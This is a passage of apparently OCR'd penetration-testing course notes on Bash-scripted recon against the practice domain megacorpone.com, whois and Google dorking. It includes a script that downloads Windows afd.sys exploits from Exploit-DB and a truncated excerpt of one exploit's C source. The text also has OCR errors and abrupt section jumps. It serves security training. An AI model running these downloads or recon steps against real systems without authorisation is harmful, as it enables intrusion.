delimiter to http:// and tell awk we want the second field ('{print $2} '). or everything after that
delimiter:

```
kali @kali:~$ grep "href=" index.html | grep "\.megacorpone" | grep -v "www\megacorpone\.com" | awk -F "http://" '{print $2}' | cut -d "/" -f 1


support.megacorpone.com">SUPPORT<
www.megacorpone.com
www.megacorpone.com
intranet.megacorpone.com">LOG IN<

admin.megacorpone.com
intranet.megacorpone.com
mail.megacorpone.com
mail2.megacorpone.com
siem.megacorpone.com
support.megacorpone.com
syslog.megacorpone.com
test.megacorpone.com
vpn.megacorpone.com
www.megacorpone.com
www2.megacorpone.com
www2.megacorpone.com
www2.megacorpone.com
admin.megacorpone.com
beta.megacorpone.com
beta.megacorpone.com
```

In this example, we will use a simple regular expression to carve ".megacorpone.com· subdomai ns
out of our file:

```
kali@kali:-$ grep -o '[^/]*\megacorpone\.com' index.html | sort -u > list.txt

kali@kali:-$ cat list.txt   
admin.megacorpone.com
beta.megacorpone.com
intranet.megacorpone.com
mail2.megacorpone.com
mail.megacorpone.com
siem.megacorpone.com
support.megacorpone.com
syslog.megacorpone.com
test.megacorpone.com
vpn.megacorpone.com
www2.megacorpone.com
www.megacorpone.com
```

This solution is quite compact, but introduces some new techniques. First, notice the grep -o
option, which only ret urns the string defined in our regular expression. If we form our expression
carefully, this single command will handle much of our previous data carving. The expression itself
looks complex but is fairly straightforward.

```
The string we are searching for('[^/]*\megacorpone\.com') is wrapped in single-quotes,
which, as we mentioned, will not allow variable expansions and will treat all enclosed characters literally.

The first block in the expression ([^/]*) is a negated (^) set ([ ]), which searches for any number of characters (*) not including a forward-slash. Notice that the periods are escaped with a backslash(\.) to reinforce that we are looking for a literal period. Next, the string must end with ·.megacorpone.com". When grep finds a matching string, it will carve it from the line and return it.

For later use, we could include other characters in a negated list by including them in a comma-delimited list. This block, ((^/,"]*), would exclude both forward-slash and double-quote characters, for example.
```

Now we have a nice, clean list of domain names linked from the front page of megacorpone.com.
Next, we will use host to discover the corresponding IP address of each domain name in our text
file. We can use a Bash one-liner loop for this:

```
kali@kali:-$ for url in $(cat list.txt); do host $url; done                   
admin.megacorpone.com has address 3.220.61.179
beta.megacorpone.com has address 3.220.61.179
intranet.megacorpone.com has address 3.220.61.179
mail2.megacorpone.com has address 3.220.61.179
mail.megacorpone.com has address 3.220.61.179
siem.megacorpone.com has address 3.220.61.179
support.megacorpone.com has address 3.212.85.86
syslog.megacorpone.com has address 3.220.61.179
test.megacorpone.com has address 3.220.61.179
vpn.megacorpone.com has address 3.220.61.179
www2.megacorpone.com has address 3.220.61.179
www.megacorpone.com has address 3.220.87.155
```

The host command gives us all sorts of output and not all of it is relevant. We will extract the IP
addresses by piping the output into a grep for "has address·, then cut the results and sort them:

```
kali@kali:-$ for url in $(cat list.txt); do host $url; done | grep "has address" | cut -d" " -f 4 | sort -u 
3.212.85.86
3.220.61.179
3.220.87.155
```

#### Practical Bash Usage - Example 2

In this example, let's assume we are in the middle of a penetration test and have unprivileged
access to a Windows machine. As we continue to collect information, we realize it may be
vulnerable to an exploit that we read about that began with the letters a, f, and d but we can't
remember the full name of the exploit. In an attempt to escalate our privileges, we want to search
for that specific exploit.

To do this, we will need to search https://www.exploit-d b.com for "afd windows·, download the
exploits that match our search criteria, and inspect them until we find the proper one. We could do
this manually through the web site, which wouldn't take too long, but if we take the time to write a
Bash script, we could easily use it to search and automatically download exploits later.

Using what we now know about scripting, let's try to automate this task.

We'll start with the Se8rchSploit 132 utility on Kali Linux. SearchSploit is a command line search tool
for Exploit-DB that allows us to take an offli ne copy of the Exploit Database with us wherever we
go. We will pass "afd windows• as a search string, use -w to return the URL for https://www.exploit-
db.com rather than the local path, and -t to search the exploit title:

```
kali@kali:-$ searchsploit afd windows -w -t                                               
------------------------------------------------------------------------------------------ --------------------------------------------
 Exploit Title                                                                            |  URL
------------------------------------------------------------------------------------------ --------------------------------------------
Microsoft Windows (x86) - 'afd.sys' Local Privilege Escalation (MS11-046)                 | https://www.exploit-db.com/exploits/40564
Microsoft Windows - 'afd.sys' Local Kernel (PoC) (MS11-046)                               | https://www.exploit-db.com/exploits/18755
Microsoft Windows - 'AfdJoinLeaf' Local Privilege Escalation (MS11-080) (Metasploit)      | https://www.exploit-db.com/exploits/21844
Microsoft Windows 7 (x64) - 'afd.sys' Dangling Pointer Privilege Escalation (MS14-040)    | https://www.exploit-db.com/exploits/39525
Microsoft Windows 7 (x86) - 'afd.sys' Dangling Pointer Privilege Escalation (MS14-040)    | https://www.exploit-db.com/exploits/39446
Microsoft Windows 7 Kernel - Pool-Based Out-of-Bounds Reads Due to bind() Implementation  | https://www.exploit-db.com/exploits/42009
Microsoft Windows XP - 'afd.sys' Local Kernel Denial of Service                           | https://www.exploit-db.com/exploits/17133
Microsoft Windows XP/2003 - 'afd.sys' Local Privilege Escalation (K-plugin) (MS08-066)    | https://www.exploit-db.com/exploits/6757
Microsoft Windows XP/2003 - 'afd.sys' Local Privilege Escalation (MS11-080)               | https://www.exploit-db.com/exploits/18176

```

This is a good start, but we need to trim the results. For now, we're only interested in the exploit's
URL, so let's grep for "http· and then cut what we need. We will use a "I" field delimiter and extract
the second field:

```
kali@kali:-$ searchsploit afd windows -w -t | grep http | cut -f 2 -d "|"
 https://www.exploit-db.com/exploits/40564
 https://www.exploit-db.com/exploits/18755
 https://www.exploit-db.com/exploits/21844
 https://www.exploit-db.com/exploits/39525
 https://www.exploit-db.com/exploits/39446
 https://www.exploit-db.com/exploits/42009
 https://www.exploit-db.com/exploits/17133
 https://www.exploit-db.com/exploits/6757
 https://www.exploit-db.com/exploits/18176
```





```
kali@kali:~$ for e in $(searchsploit afd windows -w -t | grep http | cut -f 2 -d "|");do exp_name=$(echo $e | cut -d "/" -f 5) && url=$(echo $e | sed 's/exploits/raw/') && wget -q --no-check-certificate $url -O $exp_name; done
```

Once we run it, we wait for the command prompt and verify that the exploits were indeed
downloaded, using file to verify that the files are text:

```
kali@kali:~$ ls -l  
total 408
-rw-r--r-- 1 kali kali   1363 Dec  3 04:17  17133
-rw-r--r-- 1 kali kali  12215 Dec  3 04:17  18176
-rw-r--r-- 1 kali kali   9698 Dec  3 04:17  18755
-rw-r--r-- 1 kali kali  11590 Dec  3 04:17  21844
-rw-r--r-- 1 kali kali  10575 Dec  3 04:17  39446
-rw-r--r-- 1 kali kali  14193 Dec  3 04:17  39525
-rw-r--r-- 1 kali kali  32674 Dec  3 04:17  40564
-rw-r--r-- 1 kali kali  12636 Dec  3 04:17  42009

kali@kali:~$ file 17133
17133: C source, ASCII text, with CRLF line terminators
```



We can inspect each exploit, and see that we did, in fact, grab the raw exploits:

```
$ cat 17133
////////////////////////////////////////////////////////////////////////////
//
// Title: Microsoft Windows xp AFD.sys Local Kernel DoS Exploit
// Author: Lufeng Li of Neusoft Corporation
// Vendor: www.microsoft.com
// Vulnerable: Windows xp sp3
//
/////////////////////////////////////////////////////////////////////////////

#include <stdio.h>
#include <Winsock2.h>

#pragma comment (lib, "ws2_32.lib")

BYTE buf[]={
0xac,0xfd,0xd3,0x00,0x01,0x00,0x00,0x00,0x00,0x00,
0x00,0x00,0x20,0x00,0x00,0x00,0xe8,0xfd,0xd3,0x00,
0xb8,0xfd,0xd3,0x00,0xf8,0xfd,0xd3,0x00,0xc4,0xfd,
0xd3,0x00,0xcc,0xfd,0xd3,0x00};

int main( )
.....
```

Even though we had success with a Bash one-liner, our code is not very clean and it's not
particularly easy to re-use. Let's put everything together in a Bash script to solve these problems:

```
kali@kali:~$ cat dlsploits.sh
#!/bin/bash
# Bash script to search for a given exploit and download all matches.
for e in $(searchsploit afd windows -w -t | grep http | cut -f 2 -d "|")
do
	exp_name=$(echo $e | cut -d "/" -f 5)
	url=$(echo $e | sed 's/exploits/raw/')
	wget -q --no-check-certificate $url -O $exp_name
done

kali@kali:~$ chmod +x ./dlsploits.sh

kali@kali:~$ ./dlsploits.sh
```

#### Practical Bash Usage - Example 3

As penetration testers, we are always trying to find efficiencies to minimize the time we spend
analyzing data, especially the volumes of data we recover during various scans.

Let's assume we are tasked with scanning a class C subnet to identify web servers and determine
whether or not they present an interesting attack surface. Port scanning is the process of
inspecting TCP or UDP ports on a remote machine with t he intention of detecting what services are
running on the target and potentially what attack vectors exist. We will discuss port scanning in
much more detail in another module, but for now, let's keep it general as this is a great example
that shows how Bash scripting can automate a rather tedious task.

In order to accomplish our goal, we would first port scan the entire subnet to pinpoint potential
open web services, then we could manually browse their web pages.

To begin, let's create a temporary folder to be used for this exercise:

```
kal i@kali:~$ mkdir temp

kali @kali:~$ cd temp/
```



## Passive Information Gathering

Passive Information Gathering (also known as Open-source Intelligence or OSINT1 36) is the process
of collecting openly available information about a target, generally without any direct interaction
with that target.

There are a variety of resources and tools we can use to gather this information and the process is
cyclical rather than linear. In other words, the ·next step" of any stage of the process depends on
what we find during the previous steps, creating ffcycles" of processes. Since each tool or resource
can generate any number of varied results, it can be hard to define a standardized process. The
ultimate goal of passive information gathering is to obtain information that clarifies or expands an
attack surface, 137 helps us conduct a successful phishing campaign, or supplements other
penetration testing steps such as password guessing.

Due to the cyclical nature of this process, this module will unfold differently than previous modules.
Instead of presenting linked scenarios, we will simply present various resources and tools, explain
how they work, and arm you with the basic techniques required to build a passive information-
gathering campaign.

Before we begin, we need to define passive information gathering. There are two different schools
of thought on what constitutes "passive· in this context.

In the strictest interpretation, we never communicate with the target directly. For example, we could
rely on third parties for information, but we wouldn't access any of the target's systems or servers.
Using this approach maintains a high level of secrecy about our actions and intentions, but can
also be cumbersome and may limit our results.

In a looser interpretation, we might interact with the target, but only as a normal Internet user would.
For example, if the target's website allows us to register for an account, we could do that. However,
we would not test the website for vulnerabilities during this phase.

### Taking Notes

An information gathering campaign can generate a lot of data, and it's important that we manage
that data well so that we can leverage it in further searches or use it in a later phase. There is no
right or wrong way to take notes. However, we may find it easier to retrieve information later on if
we keep det ailed and wel l formatted notes.



### Website Recon

If the client has a website, we can gather basic information by simply browsing the site. Small
organizations may only have a single website, while large organizations might have many, including
some that are not maintained. Let's check out MegaCorp One's website (https://www.megacorpone.com/) to learn more about our target.

- The about page at https://www.megacorpone.com/about.html reveals email addresses and Twitter
  accounts of some of their employees:

- It's also worth mentioning that the company's email address format follows a pattern of "first initial
  last name·. However, their CEO's email address simply uses his first name. Th[s indicates that
  founders or long-time employees have a different email format than newer hires. This information
  could be useful in a later stage of the assessment.

- Corporate social media accounts, found on the same page, are also worth recording for further
  research:

### Whois Enumeration

Whois 139 is a TCP service, tool, and a type of database that can provide information about a domain
name, such as the name server  and registrar. This information is often public since registrars
charge a fee for private registration.

We can gather basic information about a domain name by executing a standard forward search by
passing the domain name, megacorpone.com, into the whoi s client

```
kali @kali:~$ whois megacorpone.com
   Domain Name: MEGACORPONE.COM
   Registry Domain ID: 1775445745_DOMAIN_COM-VRSN
   Registrar WHOIS Server: whois.gandi.net
   Registrar URL: http://www.gandi.net
   Updated Date: 2020-06-16T17:05:41Z
   Creation Date: 2013-01-22T23:01:00Z
   Registry Expiry Date: 2024-01-22T23:01:00Z
   Registrar: Gandi SAS
   Registrar IANA ID: 81
   Registrar Abuse Contact Email: abuse@support.gandi.net
   Registrar Abuse Contact Phone: +33.170377661
   Domain Status: clientTransferProhibited https://icann.org/epp#clientTransferProhibited
   Name Server: NS1.MEGACORPONE.COM
   Name Server: NS2.MEGACORPONE.COM
   Name Server: NS3.MEGACORPONE.COM
   DNSSEC: unsigned
   URL of the ICANN Whois Inaccuracy Complaint Form: https://www.icann.org/wicf/
...
Registry Registrant ID: 
Registrant Name: Alan Grofield
Registrant Organization: MegaCorpOne
Registrant Street: 2 Old Mill St
Registrant City: Rachel
Registrant State/Province: Nevada
Registrant Postal Code: 89001
Registrant Country: US
Registrant Phone: +1.9038836342
Registrant Phone Ext:
Registrant Fax: 
Registrant Fax Ext:
Registrant Email: 3310f82fb4a8f79ee9a6bfe8d672d87e-1696395@contact.gandi.net
Registry Admin ID: 
Admin Name: Alan Grofield
Admin Organization: MegaCorpOne
Admin Street: 2 Old Mill St
Admin City: Rachel
Admin State/Province: Nevada
Admin Postal Code: 89001
Admin Country: US
Admin Phone: +1.9038836342
Admin Phone Ext:
Admin Fax: 
Admin Fax Ext:
Admin Email: 3310f82fb4a8f79ee9a6bfe8d672d87e-1696395@contact.gandi.net
Registry Tech ID: 
Tech Name: Alan Grofield
Tech Organization: MegaCorpOne
Tech Street: 2 Old Mill St
Tech City: Rachel
Tech State/Province: Nevada
Tech Postal Code: 89001
Tech Country: US
Tech Phone: +1.9038836342
Tech Phone Ext:
Tech Fax: 
Tech Fax Ext:
Tech Email: 3310f82fb4a8f79ee9a6bfe8d672d87e-1696395@contact.gandi.net
Name Server: NS1.MEGACORPONE.COM
Name Server: NS2.MEGACORPONE.COM
Name Server: NS3.MEGACORPONE.COM
...
```

- Not all of this data is useful, but we did discover some valuable information. First, the output reveals
  that Alan Grofield registered the domain name. According to the Megacorp One Contact page, Alan
  is the "IT and Security Director·.

- We also found the name servers for MegaCorp One. Name servers are a component of DNS, which
  we won't be examining here, but we should add these servers to our notes.

In addition to this standard forward lookup, which gathers information about a DNS name, the whois client can also perform reverse lookups. 

Assuming we have an IP address, we can perform   a reverse lookup to gather more information about it:

```
kali @kali:~$ whois 38.188.193.79                                                         
#
# ARIN WHOIS data and services are subject to the Terms of Use
# available at: https://www.arin.net/resources/registry/whois/tou/
#
# If you see inaccuracies in the results, please report at
# https://www.arin.net/resources/registry/whois/inaccuracy_reporting/
#
# Copyright 1997-2020, American Registry for Internet Numbers, Ltd.
#


NetRange:       38.0.0.0 - 38.255.255.255
CIDR:           38.0.0.0/8
NetName:        COGENT-A
NetHandle:      NET-38-0-0-0-1
Parent:          ()
NetType:        Direct Allocation
OriginAS:       AS174
Organization:   PSINet, Inc. (PSI)
RegDate:        1991-04-16
Updated:        2018-06-20
Comment:        IP allocations within 38.0.0.0/8 are used for Cogent customer static IP assignments.
Comment:        
Comment:        Reassignment information for this block can be found at
Comment:        rwhois.cogentco.com 4321
Ref:            https://rdap.arin.net/registry/ip/38.0.0.0

```

- The results of the reverse lookup gives us information on who is hosting the IP address. This
  informatlon could be useful later, and as with all the information we gather, we will add this to our
  notes.

### Google Hacking

https://www.exploit-db.com/google-hacking-database

```
site:megacorpone.com filetype:php
```

For example, to find interesting, non-HTML pages, we can use s;te:megacorpone.com to limit the
search to megacorpone.com and subdomains, followed by -filetype:html to exclude HTML
pages from the results:

```
site:megacorpone.com -filetype:html
```

In another example, we can use a search for intitle:"index of" "parent directory" to find
pages that contain ·index of· in the title and the words "parent directory" on the page.

```
intittle:"index of" "parentdirectory"
```

### Netcraft

